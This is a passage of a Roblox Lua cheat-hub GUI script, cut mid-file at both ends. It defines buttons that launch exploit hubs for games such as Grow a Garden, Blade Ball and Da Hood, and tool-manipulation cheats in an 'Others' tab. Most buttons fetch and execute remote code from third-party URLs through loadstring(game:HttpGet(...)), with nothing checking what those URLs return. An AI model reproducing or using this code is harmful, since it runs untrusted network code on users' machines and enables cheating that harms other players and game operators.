scgne56.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ameicaa1/brookhaven-script/main/brookhaven%20script.lua"))()
end)

scgne57 = Instance.new("TextButton")
scgne57.Parent = sc
scgne57.Name = "scgne57"
scgne57.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne57.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
scgne57.BackgroundColor3 = Color3.new(0, 0, 0)
scgne57.BorderColor3 = Color3.new(1, 0, 0)
scgne57.BorderSizePixel = 3
scgne57.TextColor3 = Color3.new(1, 1, 1)
scgne57.TextScaled = true
scgne57.Font = Enum.Font.SourceSans
scgne57.Text = "Tora Hub\n(GrowAGarden)"
scgne57.Visible = false
scgne57.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/GrowaGarden", true))()
end)

scgne58 = Instance.new("TextButton")
scgne58.Parent = sc
scgne58.Name = "scgne58"
scgne58.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne58.Position = UDim2.new(0.18, 0, 0.229999959, 0)
scgne58.BackgroundColor3 = Color3.new(0, 0, 0)
scgne58.BorderColor3 = Color3.new(1, 0, 0)
scgne58.BorderSizePixel = 3
scgne58.TextColor3 = Color3.new(1, 1, 1)
scgne58.TextScaled = true
scgne58.Font = Enum.Font.SourceSans
scgne58.Text = "KiciaHook\n(GrowAGarden)"
scgne58.Visible = false
scgne58.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b7d180acad508c48c140afe43d01ea0c.lua"))()
end)

scgne59 = Instance.new("TextButton")
scgne59.Parent = sc
scgne59.Name = "scgne59"
scgne59.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne59.Position = UDim2.new(0.35, 0, 0.229999959, 0)
scgne59.BackgroundColor3 = Color3.new(0, 0, 0)
scgne59.BorderColor3 = Color3.new(1, 0, 0)
scgne59.BorderSizePixel = 3
scgne59.TextColor3 = Color3.new(1, 1, 1)
scgne59.TextScaled = true
scgne59.Font = Enum.Font.Roboto
scgne59.Text = "Speed Hub X\n(GrowAGarden)"
scgne59.Visible = false
scgne59.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)

scgne60 = Instance.new("TextButton")
scgne60.Parent = sc
scgne60.Name = "scgne60"
scgne60.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne60.Position = UDim2.new(0.52, 0, 0.229999959, 0)
scgne60.BackgroundColor3 = Color3.new(0, 0, 0)
scgne60.BorderColor3 = Color3.new(1, 1, 0)
scgne60.BorderSizePixel = 3
scgne60.TextColor3 = Color3.new(1, 1, 1)
scgne60.TextScaled = true
scgne60.Font = Enum.Font.Roboto
scgne60.Text = "Native Hub\n(GrowAGarden)"
scgne60.Visible = false
scgne60.MouseButton1Click:Connect(function()
script_key="PASTE_KEY_HERE";
loadstring(game:HttpGet("https://getnative.cc/script/loader"))()
end)

scgne61 = Instance.new("TextButton")
scgne61.Parent = sc
scgne61.Name = "scgne61"
scgne61.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne61.Position = UDim2.new(0.69, 0, 0.229999959, 0)
scgne61.BackgroundColor3 = Color3.new(0, 0, 0)
scgne61.BorderColor3 = Color3.new(1, 0, 0)
scgne61.BorderSizePixel = 3
scgne61.TextColor3 = Color3.new(1, 1, 1)
scgne61.TextScaled = true
scgne61.Font = Enum.Font.Roboto
scgne61.Text = "No Lag Hub\n(GrowAGarden)"
scgne61.Visible = false
scgne61.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Grow-a-Garden-NoLag-Hub-no-key-38699"))()
end)

scgne62 = Instance.new("TextButton")
scgne62.Parent = sc
scgne62.Name = "scgne62"
scgne62.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgne62.Position = UDim2.new(0.86, 0, 0.229999959, 0)
scgne62.BackgroundColor3 = Color3.new(0, 0, 0)
scgne62.BorderColor3 = Color3.new(1, 1, 0)
scgne62.BorderSizePixel = 3
scgne62.TextColor3 = Color3.new(1, 1, 1)
scgne62.TextScaled = true
scgne62.Font = Enum.Font.Roboto
scgne62.Text = "H4xScripts\n(GrowAGarden)"
scgne62.Visible = false
scgne62.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader2.lua"))()


-- discord = https://discord.gg/mDJYWNBe --
end)

scgne63 = Instance.new("TextButton")
scgne63.Parent = sc
scgne63.Name = "scgne63"
scgne63.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne63.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
scgne63.BackgroundColor3 = Color3.new(0, 0, 0)
scgne63.BorderColor3 = Color3.new(1, 0, 0)
scgne63.BorderSizePixel = 3
scgne63.TextColor3 = Color3.new(1, 1, 1)
scgne63.TextScaled = true
scgne63.Font = Enum.Font.Roboto
scgne63.Text = "Plutonium Hub\n(Blade Ball)"
scgne63.Visible = false
scgne63.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))()
end)

scgne64 = Instance.new("TextButton")
scgne64.Parent = sc
scgne64.Name = "scgne64"
scgne64.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne64.Position = UDim2.new(0.18, 0, 0.43, 0)
scgne64.BackgroundColor3 = Color3.new(0, 0, 0)
scgne64.BorderColor3 = Color3.new(1, 0, 0)
scgne64.BorderSizePixel = 3
scgne64.TextColor3 = Color3.new(1, 1, 1)
scgne64.TextScaled = true
scgne64.Font = Enum.Font.Roboto
scgne64.Text = "Beanz Hub\n(Blade Ball)"
scgne64.Visible = false
scgne64.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/pid4k/scripts/main/BeanzHub.lua", true))()
end)

scgne65 = Instance.new("TextButton")
scgne65.Parent = sc
scgne65.Name = "scgne65"
scgne65.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne65.Position = UDim2.new(0.35, 0, 0.43, 0)
scgne65.BackgroundColor3 = Color3.new(0, 0, 0)
scgne65.BorderColor3 = Color3.new(1, 0, 0)
scgne65.BorderSizePixel = 3
scgne65.TextColor3 = Color3.new(1, 1, 1)
scgne65.TextScaled = true
scgne65.Font = Enum.Font.Roboto
scgne65.Text = "Frostware Hub\n(Blade Ball)"
scgne65.Visible = false
scgne65.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Fsploit/Frostware/refs/heads/main/F-R-O-S-T-W-A-R-E%20BY%20FSPLOIT-BLADE%20BALL.lua'))()
end)

scgne66 = Instance.new("TextButton")
scgne66.Parent = sc
scgne66.Name = "scgne66"
scgne66.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne66.Position = UDim2.new(0.52, 0, 0.43, 0)
scgne66.BackgroundColor3 = Color3.new(0, 0, 0)
scgne66.BorderColor3 = Color3.new(1, 0, 0)
scgne66.BorderSizePixel = 3
scgne66.TextColor3 = Color3.new(1, 1, 1)
scgne66.TextScaled = true
scgne66.Font = Enum.Font.Roboto
scgne66.Text = "XeraUltron\n(Blade Ball)"
scgne66.Visible = false
scgne66.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/luascriptsROBLOX/BladeBallXera/main/XeraUltron"))()
end)

scgne67 = Instance.new("TextButton")
scgne67.Parent = sc
scgne67.Name = "scgne67"
scgne67.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne67.Position = UDim2.new(0.69, 0, 0.43, 0)
scgne67.BackgroundColor3 = Color3.new(0, 0, 0)
scgne67.BorderColor3 = Color3.new(1, 0, 0)
scgne67.BorderSizePixel = 3
scgne67.TextColor3 = Color3.new(1, 1, 1)
scgne67.TextScaled = true
scgne67.Font = Enum.Font.Roboto
scgne67.Text = "Redz Hub\n(Blade Ball)"
scgne67.Visible = false
scgne67.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/eng"))()
end)

scgne68 = Instance.new("TextButton")
scgne68.Parent = sc
scgne68.Name = "scgne68"
scgne68.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgne68.Position = UDim2.new(0.86, 0, 0.43, 0)
scgne68.BackgroundColor3 = Color3.new(0, 0, 0)
scgne68.BorderColor3 = Color3.new(1, 0, 0)
scgne68.BorderSizePixel = 3
scgne68.TextColor3 = Color3.new(1, 1, 1)
scgne68.TextScaled = true
scgne68.Font = Enum.Font.Roboto
scgne68.Text = "Corolla Hub\n(Blade Ball)"
scgne68.Visible = false
scgne68.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/7190000/Corolla-Hub/main/ch.lua'))()
end)

scgne69 = Instance.new("TextButton")
scgne69.Parent = sc
scgne69.Name = "scgne69"
scgne69.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne69.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
scgne69.BackgroundColor3 = Color3.new(0, 0, 0)
scgne69.BorderColor3 = Color3.new(1, 0, 0)
scgne69.BorderSizePixel = 3
scgne69.TextColor3 = Color3.new(1, 1, 1)
scgne69.TextScaled = true
scgne69.Font = Enum.Font.Roboto
scgne69.Text = "Mango X\n(Da Hood)"
scgne69.Visible = false
scgne69.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/rogelioajax/lua/main/MangoHub', true))();
end)

scgne70 = Instance.new("TextButton")
scgne70.Parent = sc
scgne70.Name = "scgne70"
scgne70.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne70.Position = UDim2.new(0.18, 0, 0.63, 0)
scgne70.BackgroundColor3 = Color3.new(0, 0, 0)
scgne70.BorderColor3 = Color3.new(1, 0, 0)
scgne70.BorderSizePixel = 3
scgne70.TextColor3 = Color3.new(1, 1, 1)
scgne70.TextScaled = true
scgne70.Font = Enum.Font.Roboto
scgne70.Text = "Zinc Hub\n(Da Hood)"
scgne70.Visible = false
scgne70.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
end)

scgne71 = Instance.new("TextButton")
scgne71.Parent = sc
scgne71.Name = "scgne71"
scgne71.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne71.Position = UDim2.new(0.35, 0, 0.63, 0)
scgne71.BackgroundColor3 = Color3.new(0, 0, 0)
scgne71.BorderColor3 = Color3.new(1, 0, 0)
scgne71.BorderSizePixel = 3
scgne71.TextColor3 = Color3.new(1, 1, 1)
scgne71.TextScaled = true
scgne71.Font = Enum.Font.Roboto
scgne71.Text = "SpaceX Hub\n(Da Hood)"
scgne71.Visible = false
scgne71.MouseButton1Click:Connect(function()
-- Spacex Hub
loadstring(game:HttpGet("https://raw.githubusercontent.com/spacexrandom/Lua/main/DaHood", true))()
end)

scgne72 = Instance.new("TextButton")
scgne72.Parent = sc
scgne72.Name = "scgne72"
scgne72.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne72.Position = UDim2.new(0.52, 0, 0.63, 0)
scgne72.BackgroundColor3 = Color3.new(0, 0, 0)
scgne72.BorderColor3 = Color3.new(1, 0, 0)
scgne72.BorderSizePixel = 3
scgne72.TextColor3 = Color3.new(1, 1, 1)
scgne72.TextScaled = true
scgne72.Font = Enum.Font.Roboto
scgne72.Text = "Xray Hub\n(Da Hood)"
scgne72.Visible = false
scgne72.MouseButton1Click:Connect(function()
-- Xray Hub
loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
end)

scgne73 = Instance.new("TextButton")
scgne73.Parent = sc
scgne73.Name = "scgne73"
scgne73.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
scgne73.Position = UDim2.new(0.69, 0, 0.63, 0)
scgne73.BackgroundColor3 = Color3.new(0, 0, 0)
scgne73.BorderColor3 = Color3.new(1, 0, 0)
scgne73.BorderSizePixel = 3
scgne73.TextColor3 = Color3.new(1, 1, 1)
scgne73.TextScaled = true
scgne73.Font = Enum.Font.Roboto
scgne73.Text = "Pluto Hub\n(Da Hood)"
scgne73.Visible = false
scgne73.MouseButton1Click:Connect(function()
-- Pluto Hub
loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
end)

scgne74 = Instance.new("TextButton")
scgne74.Parent = sc
scgne74.Name = "scgne74"
scgne74.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
scgne74.Position = UDim2.new(0.86, 0, 0.63, 0)
scgne74.BackgroundColor3 = Color3.new(0, 0, 0)
scgne74.BorderColor3 = Color3.new(1, 0, 0)
scgne74.BorderSizePixel = 3
scgne74.TextColor3 = Color3.new(1, 1, 1)
scgne74.TextScaled = true
scgne74.Font = Enum.Font.Roboto
scgne74.Text = "Nuker Hub\n(Da Hood)"
scgne74.Visible = false
scgne74.MouseButton1Click:Connect(function()
-- Nuker Hub
loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
end)

scgne75 = Instance.new("TextButton")
scgne75.Parent = sc
scgne75.Name = "scgne75"
scgne75.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
scgne75.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
scgne75.BackgroundColor3 = Color3.new(0, 0, 0)
scgne75.BorderColor3 = Color3.new(1, 0, 0)
scgne75.BorderSizePixel = 2
scgne75.TextColor3 = Color3.new(1, 1, 1)
scgne75.TextScaled = true
scgne75.Font = Enum.Font.Roboto
scgne75.Text = "NullFire\n(Natural Disaster)"
scgne75.Visible = false
scgne75.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Thebestofhack123/2.0/refs/heads/main/NDS"))()
end)

scgne76 = Instance.new("TextButton")
scgne76.Parent = sc
scgne76.Name = "scgne76"
scgne76.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
scgne76.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
scgne76.BackgroundColor3 = Color3.new(0, 0, 0)
scgne76.BorderColor3 = Color3.new(1, 0, 0)
scgne76.BorderSizePixel = 2
scgne76.TextColor3 = Color3.new(1, 1, 1)
scgne76.TextScaled = true
scgne76.Font = Enum.Font.Roboto
scgne76.Text = "Tbao Hub\n(Natural Disaster)"
scgne76.Visible = false
scgne76.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubNaturalDisasterSurvival"))()
end)

-- Almost every scripts in Others Tab is taken from Infinite Yield

local oc1 = Instance.new("TextButton")
oc1.Parent = Others
oc1.Name = "oc1"
oc1.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc1.Position = UDim2.new(0.00996587239, 0, 0.150, 0)
oc1.BackgroundColor3 = Color3.new(0, 0, 0)
oc1.BorderColor3 = Color3.new(1, 0, 0)
oc1.BorderSizePixel = 3
oc1.TextColor3 = Color3.new(1, 1, 1)
oc1.TextScaled = true
oc1.Font = Enum.Font.SourceSans
oc1.Text = "Remove Tool mesh"
oc1.MouseButton1Click:Connect(function()
	for _, v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") or v:IsA("HopperBin") then
			for _, c in pairs(v:GetDescendants()) do
				if c:IsA("SpecialMesh") then
				c:Destroy()
				end
			end
		end
	end
end)

local oc2 = Instance.new("TextButton")
oc2.Parent = Others
oc2.Name = "oc2"
oc2.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc2.Position = UDim2.new(0.18, 0, 0.150, 0)
oc2.BackgroundColor3 = Color3.new(0, 0, 0)
oc2.BorderColor3 = Color3.new(1, 0, 0)
oc2.BorderSizePixel = 3
oc2.TextColor3 = Color3.new(1, 1, 1)
oc2.TextScaled = true
oc2.Font = Enum.Font.SourceSans
oc2.Text = "Toggle Key"

local kb = Instance.new("TextBox")
kb.Parent = Others
kb.Name = "kb"
kb.Size = UDim2.new(0.150000006, 0, 0.100000009, 0)
kb.Position = UDim2.new(0.180000037, 0, 0.0900000036, 0)
kb.BackgroundColor3 = Color3.new(1, 1, 1)
kb.BorderColor3 = Color3.new(1, 0, 0)
kb.BorderSizePixel = 3
kb.TextColor3 = Color3.new(0, 0, 0)
kb.TextScaled = true
kb.TextSize = 44
kb.PlaceholderText = "Enter KeyCode"
kb.Font = Enum.Font.SourceSans
kb.Text = "Enter Key"
kb.Visible = true
kb.TextXAlignment = Enum.TextXAlignment.Center
kb.TextYAlignment = Enum.TextYAlignment.Center

local oc3 = Instance.new("TextButton")
oc3.Parent = Others
oc3.Name = "oc3"
oc3.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc3.Position = UDim2.new(0.35, 0, 0.150, 0)
oc3.BackgroundColor3 = Color3.new(0, 0, 0)
oc3.BorderColor3 = Color3.new(1, 0, 0)
oc3.BorderSizePixel = 3
oc3.TextColor3 = Color3.new(1, 1, 1)
oc3.TextScaled = true
oc3.Font = Enum.Font.SourceSans
oc3.Text = "Equip all Tools"
oc3.MouseButton1Click:Connect(function()
for i,v in pairs(Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
		if v:IsA("Tool") or v:IsA("HopperBin") then
			v.Parent = Players.LocalPlayer.Character
		end
	end
end)

local oc4 = Instance.new("TextButton")
oc4.Parent = Others
oc4.Name = "oc4"
oc4.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc4.Position = UDim2.new(0.52, 0, 0.150, 0)
oc4.BackgroundColor3 = Color3.new(0, 0, 0)
oc4.BorderColor3 = Color3.new(1, 0, 0)
oc4.BorderSizePixel = 3
oc4.TextColor3 = Color3.new(1, 1, 1)
oc4.TextScaled = true
oc4.Font = Enum.Font.SourceSans
oc4.Text = "Drop Tools"
oc4.MouseButton1Click:Connect(function()
for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Players.LocalPlayer.Character
		end
	end
	wait()
	for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = workspace
		end
	end
end)


local oc5 = Instance.new("TextButton")
oc5.Parent = Others
oc5.Name = "oc5"
oc5.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc5.Position = UDim2.new(0.69, 0, 0.150, 0)
oc5.BackgroundColor3 = Color3.new(0, 0, 0)
oc5.BorderColor3 = Color3.new(1, 0, 0)
oc5.BorderSizePixel = 3
oc5.TextColor3 = Color3.new(1, 1, 1)
oc5.TextScaled = true
oc5.Font = Enum.Font.SourceSans
oc5.Text = "Enable Tools"
oc5.MouseButton1Click:Connect(function()
local Backpack = Players.LocalPlayer:FindFirstChildOfClass("Backpack")
	local ammount = tonumber(1000) or 1
	local delay_ = tonumber(1) or false
	for _, v in ipairs(Backpack:GetChildren()) do
		v.Parent = Players.LocalPlayer.Character
		task.spawn(function()
			for _ = 1, ammount do
				v:Activate()
				if delay_ then
					wait(delay_)
				end
			end
			v.Parent = Backpack
		end)
	end
end)

local oc6 = Instance.new("TextButton")
oc6.Parent = Others
oc6.Name = "oc6"
oc6.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
oc6.Position = UDim2.new(0.86, 0, 0.150, 0)
oc6.BackgroundColor3 = Color3.new(0, 0, 0)
oc6.BorderColor3 = Color3.new(1, 0, 0)
oc6.BorderSizePixel = 3
oc6.TextColor3 = Color3.new(1, 1, 1)
oc6.TextScaled = true
oc6.Font = Enum.Font.SourceSans
oc6.Text = "Equip Tool"
oc6.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
end)

local oc7 = Instance.new("TextButton")
oc7.Parent = Others
oc7.Name = "oc7"
oc7.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc7.Position = UDim2.new(0.00996587239, 0, 0.350, 0)
oc7.BackgroundColor3 = Color3.new(0, 0, 0)
oc7.BorderColor3 = Color3.new(1, 0, 0)
oc7.BorderSizePixel = 3
oc7.TextColor3 = Color3.new(1, 1, 1)
oc7.TextScaled = true
oc7.Font = Enum.Font.SourceSans
oc7.Text = "Save Tools"
oc7.MouseButton1Click:Connect(function()

    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local character = LocalPlayer.Character

    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                item.Parent = LocalPlayer
                
            end
        end
    end

    if character then
        for _, item in pairs(character:GetChildren()) do
            if item:IsA("Tool") then
                item.Parent = LocalPlayer
                
            end
        end
    end
end)

local oc8 = Instance.new("TextButton")
oc8.Parent = Others
oc8.Name = "oc8"
oc8.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc8.Position = UDim2.new(0.18, 0, 0.350, 0)
oc8.BackgroundColor3 = Color3.new(0, 0, 0)
oc8.BorderColor3 = Color3.new(1, 0, 0)
oc8.BorderSizePixel = 3
oc8.TextColor3 = Color3.new(1, 1, 1)
oc8.TextScaled = true
oc8.Font = Enum.Font.SourceSans
oc8.Text = "Load Tools"
oc8.MouseButton1Click:Connect(function()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then
        warn("Backpack not found for LocalPlayer!")
        return
    end

    for _, item in pairs(LocalPlayer:GetChildren()) do
        if item:IsA("Tool") then
            item.Parent = backpack
            
        end
    end

    
    local character = LocalPlayer.Character
    if character then
        for _, item in pairs(character:GetChildren()) do
            if item:IsA("Tool") then
                item.Parent = backpack
                
            end
        end
    end
end)

local oc9 = Instance.new("TextButton")
oc9.Parent = Others
oc9.Name = "oc9"
oc9.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc9.Position = UDim2.new(0.35, 0, 0.350, 0)
oc9.BackgroundColor3 = Color3.new(0, 0, 0)
oc9.BorderColor3 = Color3.new(1, 0, 0)
oc9.BorderSizePixel = 3
oc9.TextColor3 = Color3.new(1, 1, 1)
oc9.TextScaled = true
oc9.Font = Enum.Font.SourceSans
oc9.Text = "Activate Tools"
oc9.MouseButton1Click:Connect(function()
    local backpackTools = Players.LocalPlayer.Backpack:GetChildren() 
    for i, tool in pairs(backpackTools) do
        if tool:IsA("Tool") then
            tool.Parent = Players.LocalPlayer.Character
            tool:Activate()
            tool.Parent = Players.LocalPlayer:WaitForChild("Backpack")
        end
    end
end)

local oc10 = Instance.new("TextButton")
oc10.Parent = Others 
oc10.Name = "oc10"
oc10.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc10.Position = UDim2.new(0.52, 0, 0.350, 0)
oc10.BackgroundColor3 = Color3.new(0, 0, 0)
oc10.BorderColor3 = Color3.new(1, 0, 0)
oc10.BorderSizePixel = 3
oc10.TextColor3 = Color3.new(1, 1, 1)
oc10.TextScaled = true
oc10.Font = Enum.Font.SourceSans
oc10.Text = "Use Tools"

kb2 = Instance.new("TextBox")
kb2.Parent = Others
kb2.Name = "kb2"
kb2.Size = UDim2.new(0.15, 0, 0.07, 0)
kb2.Position = UDim2.new(0.52, 0, 0.33, 0)
kb2.BackgroundColor3 = Color3.new(1, 1, 1)
kb2.BorderColor3 = Color3.new(1, 0, 0)
kb2.BorderSizePixel = 2
kb2.TextColor3 = Color3.new(0, 0, 0)
kb2.PlaceholderText = "0.1 less or more"
kb2.PlaceholderColor3 = Color3.new(0, 0, 0)
kb2.TextScaled = true
kb2.Font = Enum.Font.SourceSans
kb2.Text = "0.1"

oc10.MouseButton1Click:Connect(function()
    local idkwut = kb2.Text

    local waitDuration = tonumber(idkwut)

    if waitDuration == nil or waitDuration < 0 then
        waitDuration = 0.1
    end

    if waitDuration < 0.05 then
        waitDuration = 0.05
    end

    local backpackTools = Players.LocalPlayer.Backpack:GetChildren()
    for i, tool in pairs(backpackTools) do
        if tool:IsA("Tool") then
            tool.Parent = Players.LocalPlayer.Character
            tool:Activate()
            task.wait(waitDuration)
            tool.Parent = Players.LocalPlayer:WaitForChild("Backpack")
        end
    end
end)

local oc11 = Instance.new("TextButton")
oc11.Parent = Others
oc11.Name = "oc11"
oc11.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc11.Position = UDim2.new(0.69, 0, 0.350, 0)
oc11.BackgroundColor3 = Color3.new(0, 0, 0)
oc11.BorderColor3 = Color3.new(1, 0, 0)
oc11.BorderSizePixel = 3
oc11.TextColor3 = Color3.new(1, 1, 1)
oc11.TextScaled = true
oc11.Font = Enum.Font.SourceSans
oc11.Text = "Remove Equipped Tool"
oc11.MouseButton1Click:Connect(function()
    local character = LocalPlayer.Character
    if character then
        local toolsDestroyed = 0
        for _, item in pairs(character:GetChildren()) do
            if item:IsA("Tool") then
                item:Destroy()
                
                toolsDestroyed += 1
            end
        end
        if toolsDestroyed > 0 then
            print(" .. toolsDestroyed .. ")
        end
    else
        warn("LocalPlayer's Character not found.")
    end
end)

local oc12 = Instance.new("TextButton")
oc12.Parent = Others
oc12.Name = "oc12"
oc12.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
oc12.Position = UDim2.new(0.86, 0, 0.350, 0)
oc12.BackgroundColor3 = Color3.new(0, 0, 0)
oc12.BorderColor3 = Color3.new(1, 0, 0)
oc12.BorderSizePixel = 3
oc12.TextColor3 = Color3.new(1, 1, 1)
oc12.TextScaled = true
oc12.Font = Enum.Font.SourceSans
oc12.Text = "Tool Editor Gui"
oc12.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Grippos-Tool-Editor/refs/heads/main/ToolEditor.lua"))()
end)

local oc13 = Instance.new("TextButton")
oc13.Parent = Others
oc13.Name = "oc13"
oc13.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc13.Position = UDim2.new(0.00996587239, 0, 0.550, 0)
oc13.BackgroundColor3 = Color3.new(0, 0, 0)
oc13.BorderColor3 = Color3.new(1, 0, 0)
oc13.BorderSizePixel = 3
oc13.TextColor3 = Color3.new(1, 1, 1)
oc13.TextScaled = true
oc13.Font = Enum.Font.SourceSans
oc13.Text = "Grab All Tools"

local oc14 = Instance.new("TextButton")
oc14.Parent = Others
oc14.Name = "oc14"
oc14.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc14.Position = UDim2.new(0.18, 0, 0.550, 0)
oc14.BackgroundColor3 = Color3.new(0, 0, 0)
oc14.BorderColor3 = Color3.new(1, 0, 0)
oc14.BorderSizePixel = 3
oc14.TextColor3 = Color3.new(1, 1, 1)
oc14.TextScaled = true
oc14.Font = Enum.Font.SourceSans
oc14.Text = "TouchTrasmitters"

local oc15 = Instance.new("TextButton")
oc15.Parent = Others
oc15.Name = "oc15"
oc15.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc15.Position = UDim2.new(0.35, 0, 0.550, 0)
oc15.BackgroundColor3 = Color3.new(0, 0, 0)
oc15.BorderColor3 = Color3.new(1, 0, 0)
oc15.BorderSizePixel = 3
oc15.TextColor3 = Color3.new(1, 1, 1)
oc15.TextScaled = true
oc15.Font = Enum.Font.SourceSans
oc15.Text = "TouchInterests"

local oc16 = Instance.new("TextButton")
oc16.Parent = Others
oc16.Name = "oc16"
oc16.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc16.Position = UDim2.new(0.52, 0, 0.550, 0)
oc16.BackgroundColor3 = Color3.new(0, 0, 0)
oc16.BorderColor3 = Color3.new(1, 0, 0)
oc16.BorderSizePixel = 3
oc16.TextColor3 = Color3.new(1, 1, 1)
oc16.TextScaled = true
oc16.Font = Enum.Font.SourceSans
oc16.Text = "Go To Part"

local oc17 = Instance.new("TextButton")
oc17.Parent = Others
oc17.Name = "oc17"
oc17.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc17.Position = UDim2.new(0.69, 0, 0.550, 0)
oc17.BackgroundColor3 = Color3.new(0, 0, 0)
oc17.BorderColor3 = Color3.new(0, 0, 1)
oc17.BorderSizePixel = 3
oc17.TextColor3 = Color3.new(1, 1, 1)
oc17.TextScaled = true
oc17.Font = Enum.Font.SourceSans
oc17.Text = "Bring part"

local oc18 = Instance.new("TextBox")
oc18.Parent = Others
oc18.Name = "oc18"
oc18.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
oc18.Position = UDim2.new(0.86, 0, 0.550, 0)
oc18.BackgroundColor3 = Color3.new(1, 1, 1)
oc18.BorderColor3 = Color3.new(1, 0, 0)
oc18.BorderSizePixel = 3
oc18.TextColor3 = Color3.new(0, 0, 0)
oc18.TextScaled = true
oc18.Font = Enum.Font.SourceSans
oc18.Text = "Part Name"
oc18.PlaceholderText = "Part Name"
oc18.TextXAlignment = Enum.TextXAlignment.Center
oc18.TextYAlignment = Enum.TextYAlignment.Center

local oc19 = Instance.new("TextButton")
oc19.Parent = Others
oc19.Name = "oc19"
oc19.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc19.Position = UDim2.new(0.00996587239, 0, 0.750, 0)
oc19.BackgroundColor3 = Color3.new(0, 0, 0)
oc19.BorderColor3 = Color3.new(0, 0, 1)
oc19.BorderSizePixel = 3
oc19.TextColor3 = Color3.new(1, 1, 1)
oc19.TextScaled = true
oc19.Font = Enum.Font.SourceSans
oc19.Text = "Bring player"

local oc20 = Instance.new("TextButton")
oc20.Parent = Others
oc20.Name = "oc20"
oc20.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
oc20.Position = UDim2.new(0.18, 0, 0.750, 0)
